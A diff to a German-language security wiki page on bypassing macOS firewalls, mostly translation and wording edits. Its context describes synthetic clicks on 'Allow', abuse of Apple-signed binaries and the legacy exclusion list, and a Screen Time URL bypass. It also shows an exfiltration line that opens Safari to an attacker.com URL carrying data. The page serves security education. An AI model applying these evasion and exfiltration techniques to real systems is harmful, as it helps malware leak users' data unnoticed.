@@ -12,7 +12,7 @@ Die folgenden Techniken wurden in einigen macOS-Firewall-Apps als funktionierend
 
 ### Synthetischer Klick
 
-- Wenn die Firewall den Benutzer um Erlaubnis bittet, die Malware **auf Erlauben klicken** lassen.
+- Wenn die Firewall um Erlaubnis vom Benutzer bittet, lasse die Malware **auf Erlauben klicken**.
 
 ### **Verwendung von von Apple signierten Binärdateien**
 
@@ -65,6 +65,7 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 
 Wenn Sie **Code in einen Prozess injizieren** können, der berechtigt ist, eine Verbindung zu einem beliebigen Server herzustellen, könnten Sie die Firewall-Schutzmaßnahmen umgehen:
 
+
 {{#ref}}
 macos-proces-abuse/
 {{#endref}}
@@ -83,14 +84,14 @@ open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
 # if the patch is missing Safari will happily load the page
 ```
 ### Packet Filter (PF) Regelreihenfolge-Fehler in der frühen macOS 14 “Sonoma”
-Während des macOS 14 Beta-Zyklus führte Apple eine Regression im Userspace-Wrapper um **`pfctl`** ein. Regeln, die mit dem `quick` Schlüsselwort hinzugefügt wurden (das von vielen VPN-Kill-Switches verwendet wird), wurden stillschweigend ignoriert, was zu Datenlecks führte, selbst wenn eine VPN/Firewall-GUI *blockiert* meldete. Der Fehler wurde von mehreren VPN-Anbietern bestätigt und in RC 2 (Build 23A344) behoben.
+Während des macOS 14 Beta-Zyklus führte Apple eine Regression im Userspace-Wraparound **`pfctl`** ein. Regeln, die mit dem `quick` Schlüsselwort hinzugefügt wurden (verwendet von vielen VPN-Kill-Switches), wurden stillschweigend ignoriert, was zu Datenlecks führte, selbst wenn eine VPN/Firewall-GUI *blockiert* meldete. Der Fehler wurde von mehreren VPN-Anbietern bestätigt und in RC 2 (Build 23A344) behoben.
 
-Schnelle Leak-Prüfung:
+Schneller Leak-Check:
 ```bash
 pfctl -sr | grep quick       # rules are present…
 sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 ```
-### Missbrauch von von Apple signierten Hilfsdiensten (Legacy – vor macOS 11.2)
+### Missbrauch von von Apple signierten Hilfsdiensten (legacy – vor macOS 11.2)
 Vor macOS 11.2 erlaubte die **`ContentFilterExclusionList`** ~50 Apple-Binärdateien wie **`nsurlsessiond`** und den App Store, alle Socket-Filter-Firewalls, die mit dem Network Extension-Framework implementiert wurden (LuLu, Little Snitch usw.), zu umgehen. Malware konnte einfach einen ausgeschlossenen Prozess starten – oder Code in ihn injizieren – und ihren eigenen Datenverkehr über den bereits erlaubten Socket tunneln. Apple hat die Ausschlussliste in macOS 11.2 vollständig entfernt, aber die Technik ist auf Systemen, die nicht aktualisiert werden können, weiterhin relevant.
 
 Beispiel für einen Proof-of-Concept (vor 11.2):
